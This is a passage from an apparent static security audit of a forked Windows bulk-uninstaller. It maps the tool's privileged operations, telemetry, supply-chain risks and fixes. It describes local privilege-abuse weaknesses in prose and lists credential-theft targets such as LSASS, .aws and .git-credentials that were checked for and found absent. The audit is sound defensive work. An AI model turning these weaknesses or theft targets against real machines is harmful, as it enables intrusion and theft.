| `DisplayVersion` written back into that key | `source/BulkCrapUninstaller/Program.cs:202` | Keeps the displayed version current. Writes only to BCU's own key, located by matching its own AppID GUID |
| Start-menu group and optional desktop icon | `installer/BcuSetup.iss` `[Icons]`, `[Tasks]` | Standard shortcuts, desktop icon is opt-in |
| `HKCU\…\Applets\Regedit\LastKey` | `source/KlocTools/Tools/RegistryTools.cs:449-452` | Sets regedit's last-viewed key so "Open in regedit" lands on the right node. Cosmetic, per-user |
| Single-instance mutex `Global\BCU-singleinstance` | `source/BulkCrapUninstaller/EntryPoint.cs:29` | Runtime only, not persistence |

**Persistence that BCU reads and removes** (the Startup Manager, `source/UninstallTools/Startup/`) — this is the product's advertised purpose, not a finding:

- `HKLM`/`HKCU` `…\CurrentVersion\Run`, `RunOnce`, and their `Wow6432Node` variants (`StartupEntryFactory.cs:27-43`)
- `…\Explorer\StartupApproved\{Run,RunOnce,RunOnce32,StartupFolder}` enable/disable state (`NewStartupDisable.cs:94-114`)
- User and common Startup folders
- Windows **services** — enumerated, stopped, and deleted (`Startup/Service/ServiceEntry.cs:60`, `ServiceEntryFactory.DeleteService`)
- **Scheduled tasks** — via the `TaskScheduler` package (`Startup/Task/TaskEntryFactory.cs`)
- Browser helper objects / browser extensions (`Startup/Browser/BrowserEntryFactory.cs`)

**No WMI event-subscription persistence** (`__EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding`) is created or removed anywhere. WMI is used read-only, for Windows feature enumeration.

---

## 12. Privileged Operations

Every executable in the solution inherits `..\app.manifest` via `source/Directory.Build.props:25`:

```xml
<requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
```

and the native launcher sets `<UACExecutionLevel>RequireAdministrator</UACExecutionLevel>` in `source/BCU-launcher/BCU-launcher.vcxproj` (all four configurations). **There is no unprivileged mode.** The application cannot be run as a standard user, and there is no privilege separation between the discovery phase (which parses entirely untrusted registry and filesystem data) and the execution phase.

This is the single most important architectural fact in this review: it converts several issues that would otherwise be Low into Critical/High, because *every* parsing bug, path bug, and search-path bug is reached with an Administrator token.

| Operation | Location | Notes |
|---|---|---|
| Recursive file/folder deletion | `UniversalUninstaller/Program.cs:104` | **Permanent**, not recycled. BCU-C01, BCU-C02 |
| Deletion to the Recycle Bin | `Junk/Containers/FileSystemJunk.cs:26-35` | Reversible ✓. Note: items exceeding the bin quota, or on network/removable volumes, are deleted permanently by the shell regardless |
| Registry key tree deletion | `Junk/Containers/RegistryKeyJunk.cs:45-51` | `DeleteSubKeyTree`, incl. HKLM. Optional `.reg` backup first |
| Registry value deletion | `Junk/Containers/RegistryValueJunk.cs` | Includes `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules` — **BCU can delete Windows Firewall rules** as "junk" (`FirewallRuleScanner.cs:19`) |
| Registry export via `regedit /e` | `KlocTools/Tools/RegistryTools.cs:388-436` | Kills any running regedit first; writes to `%TEMP%\BCU\tempBackup.reg` |
| Arbitrary process execution | `Uninstaller/UninstallManager.cs:127,132` | `UseShellExecute = true`, command from the registry |
| MSI execution | `Uninstaller/UninstallManager.cs:238-256` | `MsiExec.exe /X{guid}` — GUID-typed, **not** injectable ✓ |
| Process termination | `Uninstaller/BulkUninstallEntry.cs:378,390`; `RegistryTools.cs:390-394` | Kills uninstaller process trees and regedit |
| Service stop/start/delete | `Startup/Service/ServiceEntryFactory.cs`; `OculusHelper/OculusManager.cs:187-200` | `OVRService` explicitly |
| Scheduled task deletion | `Startup/Task/TaskEntryFactory.cs` | Via `TaskScheduler` package |
| Windows feature disable | `KlocTools/IO/DismTools.cs:102-106` | `Dism.exe /online /disable-feature` — absolute system path ✓ |
| Windows Update removal | `WinUpdateHelper/` | WUApiLib COM |
| UWP/Store package removal | `StoreAppHelper/AppManager.cs:24-57` | `PackageManager.RemovePackageAsync` |
| Take ownership / grant ACL | `Forms/Windows/MainWindow.cs:558-561` | `takeown` + `icacls … /grant administrators:F`. BCU-H02 |
| System restore point creation | `Functions/AppUninstaller.cs:227` | Defensive ✓ — created before bulk uninstalls when `MessagesRestorePoints != No` |
| Arbitrary user-configured commands | `Functions/AppUninstaller.cs:641-667` | `ExternalPreCommands` / `ExternalPostCommands`, run elevated. User-authored, `File.Exists`-checked, opt-in — acceptable by design |
| UI automation of other processes | `UninstallerAutomatizer/` | Attaches to and clicks buttons in arbitrary windows. BCU-M03 |
| PowerShell with `-ex unrestricted` | `Factory/ScoopFactory.cs:416` | BCU-H04 |

**Not present:** no driver installation or loading, no `SeDebugPrivilege`/`SeTakeOwnershipPrivilege` token manipulation, no `LogonUser`/`ImpersonateLoggedOnUser`/`CreateProcessAsUser`, no `netsh` firewall configuration, no Windows Defender exclusion management, no `AdjustTokenPrivileges`, no UAC-bypass technique implemented deliberately.

---

## 13. Data Collection

### 13.1 Collected and transmitted

| Data | Where collected | Where sent | Default |
|---|---|---|---|
| Machine/user fingerprint (`MiscUserId`) — MD5 of Windows SID + all identity claims + concatenated MAC addresses of every NIC | `Program.cs:150-168` | Every request to the home server | Generated on first run, always |
| Exception type, message, full stack trace, target site | NBug | `SendCrashReport` | **Always** (dialog-gated only) |
| OS version string, 64-bit flag, installed UI locale, app + CLR version | `NBugConfigurator.cs:26-32` | `SendCrashReport` | Always |
| UI event hit counts, launch count, installed .NET versions | `Tracking/UsageManager.cs:139-152` | `SendStats` | **Off** |
| Application ratings (MD5-hashed app name + rating) | `Ratings/UninstallerRatingManager.cs` | `SetUserRating` | **Off** |

**Note on the crash-report contents:** stack traces from an uninstaller predictably include paths such as `C:\Users\<username>\AppData\Local\Programs\<app>\…`, registry paths, and installed-application names. This is personal data under most privacy regimes, and `PrivacyPolicy.txt`'s assertion that the collected information "is not personally identifiable" is inaccurate for this channel.

### 13.2 Collected and stored locally only

`InfoCache.xml`, `CertCache.xml`, `UsageStatistics.xml`, `RatingCashe_*.json`, `CustomNotes.xml`, `*.log`, `Exception_*.zip`, `BCUninstaller.settings` — all written next to the executable (`UninstallToolsGlobalConfig.cs:88`, `UsageManager.cs:20`, `Program.cs:108`). For an installed deployment that is `%ProgramFiles%\BCUninstaller` (administrator-writable only). For a **portable** deployment that is wherever the user extracted it, which is typically user-writable — the basis of BCU-M04's cache-poisoning note and BCU-M06.

### 13.3 Explicitly NOT collected

Verified by targeted search across the whole repository:

- **No** browser credential, cookie, or profile access
- **No** Windows Credential Manager (`CredRead`/`CredEnumerate`) usage
- **No** DPAPI (`ProtectedData`, `CryptProtectData`) usage
- **No** LSASS interaction of any kind
- **No** SSH key, `.aws`, `.npmrc`, `.git-credentials`, or dotfile harvesting
- **No** clipboard *reading* (`AdvancedClipboardCopy` only *writes* a user-requested export to the clipboard)
- **No** keystroke, screenshot, microphone, or camera capture
- **No** environment-variable exfiltration (`SCOOP`/`SCOOP_GLOBAL`/`PATH` are read for discovery only and never transmitted)
- **No** file-content exfiltration — only counts, names, versions, and sizes are ever gathered

---

## 14. Supply Chain Risks

| # | Risk | Severity | Detail |
|---|---|---|---|
| 1 | **The fork cannot be verified against upstream** | **High** | There is no `.git` directory in this working copy — `git rev-parse --show-toplevel` resolves to `C:\`, not to the project. There is no way to diff this tree against `Klocman/Bulk-Crap-Uninstaller`, no commit history, no tags, no signatures. Nothing observed looks tampered with, but that is an absence of evidence, not evidence of absence |
| 2 | Unpinned action holding a publishing secret | **High** | `vedantmgoyal9/winget-releaser@main` + `secrets.WINGET_TOKEN` — see **BCU-H05** |
| 3 | No dependency lock files; two floating ranges | **Medium** | See **BCU-M07** |
| 4 | Installer downloads and executes without a checksum | **Medium** | See **BCU-M05** |
| 5 | Vendored abandonware | **Medium** | NBug 1.2 (upstream dead since ~2013) and ObjectListView (dormant) are copied into the source tree. No upstream will ship security fixes; you own them permanently |
| 6 | Unsigned binaries in the source tree | **Low** | Three NBug developer binaries, not referenced by any build, not shipped — see **BCU-L07** |
| 7 | CI actions pinned to mutable tags; no `permissions:` block | **Low** | See **BCU-L06** |
| 8 | CI builds untrusted PR code | **Low** | `ci.yaml` triggers on `pull_request`; MSBuild targets in a PR are arbitrary code execution on the runner. Mitigated by GitHub's default read-only token for fork PRs |
| 9 | Low-adoption transitive shim | **Low** | `FlaUI.Adapter.White 0.2.1` |
| 10 | Third-party binary redistribution | **Low** | `es.exe` is redistributed. Signature verified valid, but confirm voidtools' redistribution terms before shipping it in a commercial product |

---

## 15. Recommended Remediation

### Before any product work begins

1. **Establish provenance.** Clone `Klocman/Bulk-Crap-Uninstaller` at the matching tag into a separate directory and diff it against this tree file-by-file. Until that diff is clean, treat every finding in this report as *at least* as severe as stated. Then `git init` this fork with a clean initial commit recording the exact upstream base commit.
2. **Delete the upstream telemetry channel.** Remove `NBugConfigurator`, `DatabaseStatSender`, `UsageManager`, `UninstallerRatingManager`, and the `NBug_custom` project, or repoint them at infrastructure you control over HTTPS. Shipping a product that phones home to `bugsklocman.ddns.net` over plaintext HTTP is not defensible. (**BCU-M01**)
3. **Delete `.github/workflows/winget.yml`** unless you intend to publish to winget yourself; if you do, pin the action to a SHA and scope the token. (**BCU-H05**)

### Critical — fix before building anything on this

4. **Add path guards to `UniversalUninstaller`.** Canonicalise the target, reject drive roots, `%WINDIR%`, `%ProgramFiles%`, `%ProgramData%`, `%USERPROFILE%`, and every known folder; require a minimum depth below a recognised install root. Also gate `SimpleDelete` generation on `IsSystemDirectory`. (**BCU-C01**)
5. **Stop following reparse points.** Skip any `FileAttributes.ReparsePoint` entry in `RecursiveDelete` and delete the link rather than its target; re-validate containment at each recursion level. (**BCU-C02**)

### High — fix before shipping

6. **Rewrite `PathTools.GetFullPathOfExecutable`.** Drop `Environment.CurrentDirectory` and the HKCU App Paths fallback. Resolve system binaries from absolute `%SystemRoot%\System32` paths. Before executing any discovered third-party tool from an elevated context, verify the resolved path is not writable by non-administrators. (**BCU-H01**)
7. **Eliminate both `cmd.exe` string-concatenation sinks.** Replace `TakeOwnership` with the managed ACL API; delete `GetOldSimpleDeleteString` entirely. (**BCU-H02**, **BCU-H03**)
8. **Harden the Scoop integration.** Absolute `powershell.exe` path, `-File` invocation, `ArgumentList` for arguments, reject app names containing shell metacharacters, refuse to run a `scoop.ps1` from a non-administrator-writable location. (**BCU-H04**)

### Medium — fix before wide deployment

9. Create the NSIS temp copy in a fresh random directory with a restrictive DACL, using `FileMode.CreateNew`. (**BCU-M02**)
10. Add `PipeOptions.CurrentUserOnly` plus a restrictive `PipeSecurity` to the automation daemon pipe; randomise the pipe name per run; validate PIDs against a spawned-process allowlist. (**BCU-M03**)
11. Replace `X509Certificate2.Verify()` with `WinVerifyTrust`; distinguish signed/tampered/unsigned in the UI; protect `CertCache.xml`. (**BCU-M04**)
12. Populate the `Checksum` argument for every installer dependency; remove the pre-existing-file download bypass; prefer the self-contained (non-`Light`) installer variant. (**BCU-M05**)
13. Use absolute paths for `cmd.exe`, `regedit.exe`, and `CleanLogs.bat` — or drop the batch file and delete logs in-process. (**BCU-M06**)
14. Enable `RestorePackagesWithLockFile`, commit the lock files, build with `--locked-mode`, pin the two floating ranges, add a `nuget.config` with source mapping. (**BCU-M07**)

### Low — schedule

15. Fix the case-sensitive Windows-directory check (**BCU-L01**) and route containment checks through `SubPathIsInsideBasePath` (**BCU-L02**).
16. Add a regex match timeout for uninstall-list filters (**BCU-L03**).
17. Bound the `WaitForDirEmpty` loop (**BCU-L04**).
18. Replace the SID/MAC/MD5 fingerprint with a stored random GUID (**BCU-L05**).
19. Pin CI actions to SHAs, add a `permissions:` block (**BCU-L06**).
20. Delete the three unsigned NBug binaries (**BCU-L07**).
21. Refuse sub-`VeryGood` junk confidence under `/U` without an extra explicit flag (**BCU-L08**).

### Architectural recommendations for a derived product

22. **Split the privilege boundary.** Today, untrusted registry and filesystem parsing happens in the same Administrator-token process that executes commands and deletes files. Run discovery in a medium-integrity process and pass a validated, structured work list to a small elevated broker that re-validates every path and command before acting. This single change neutralises most of this report.
23. **Treat HKCU-sourced entries as lower-trust than HKLM ones** throughout, and require additional confirmation before acting on them.
24. **Introduce a central path-safety module** — one canonicalising, boundary-aware, reparse-point-aware, case-insensitive validator that every delete, execute, and take-ownership path must call. The current logic is scattered across `PathTools`, `UninstallToolsGlobalConfig`, `JunkCreatorBase`, and `UniversalUninstaller`, with inconsistent semantics between them; that inconsistency is the root cause of BCU-C01, BCU-C02, BCU-L01, and BCU-L02.
25. **Log every destructive action** (path, registry key, command line, outcome) to a tamper-evident audit trail. For an elevated bulk-deletion tool this is a baseline requirement, and it is currently absent.
26. **Sign all shipped binaries**, and set `AllowedReferenceRelatedFileExtensions` / strip PDBs consistently across both build paths.

---

## 16. Safe-to-Build Assessment

### What this codebase is

A mature, well-known, Apache-2.0 open-source utility with a coherent architecture, real test coverage in places, and no sign of malicious intent. The defensive engineering that *is* present is genuine: system restore points before bulk operations, Recycle Bin deletion for junk, registry backups before key removal, a confidence-scoring system for junk candidates, protected-item warnings, a simulate mode, opt-in-by-default telemetry, and prominent warnings on the dangerous CLI switches. `DtdProcessing` is explicitly prohibited on the one XML parser that reads untrusted files. MSI uninstall strings are GUID-typed rather than string-concatenated. DISM is invoked by absolute path.

### What it is not

It is not a codebase written to withstand a **local attacker who controls the registry and the filesystem it reads**. Its threat model is clearly "the machine is honest, the uninstaller entries are honest, help me clean up." Every one of the Critical and High findings above follows from that assumption meeting a `requireAdministrator` manifest with no privilege separation. These are not exotic bugs; they are the predictable consequence of parsing user-writable input in an elevated process.

For its intended audience — an IT professional running it interactively on a machine they already control — that trade-off is defensible, and it is presumably why these issues have survived upstream. **For a commercial product**, particularly one deployed at scale or run unattended by management tooling, it is not. The BCU-C01 chain in particular is reachable by any standard user on the machine and results in elevated destruction of arbitrary directories.

### Confidence and limits of this review

- Static analysis only. Nothing was executed, built, or contacted. Runtime behaviour, dynamic COM interactions, and actual network responses are unverified.
- The two vendored third-party trees (`ObjectListView`, 45k LOC; `NBug_custom`, 9.6k LOC) were reviewed for network activity, process execution, deserialisation, and reflection, but not line-by-line for logic defects.
- **No upstream diff was possible.** This is the largest gap. The code reads as authentic BCU throughout — consistent copyright headers, coherent history in the comments, matching version numbers, and shipped binaries signed by the correct publishers — but a targeted modification cannot be ruled out from this working copy alone.
- All 964 `.resx` localisation files were scanned for embedded URLs and payloads; nothing was found beyond translated UI strings.

### Verdict

# PROCEED WITH REMEDIATION

There is no malware here, no backdoor, and no hidden exfiltration channel — the codebase is what it claims to be, and it is a reasonable foundation to build on. But it ships two Critical and five High defects that are directly exploitable by an unprivileged local user against an Administrator-token process, plus an undisclosed plaintext-HTTP telemetry channel to a third party's personal server that must not survive into a derived product.

**Gate any product work on:** items 1–3 (provenance, telemetry removal, workflow removal) and items 4–8 (the Critical and High fixes). Those are eight changes, most of them small and well-localised. After them, this is a solid base.

**Then plan for** item 22 — separating the discovery and execution privilege boundaries. It is the difference between patching the eight bugs found here and structurally preventing the ninth.

---

*Prepared by static analysis. No code in this repository was executed, built, installed, or contacted during this review, and no application source file was modified.*
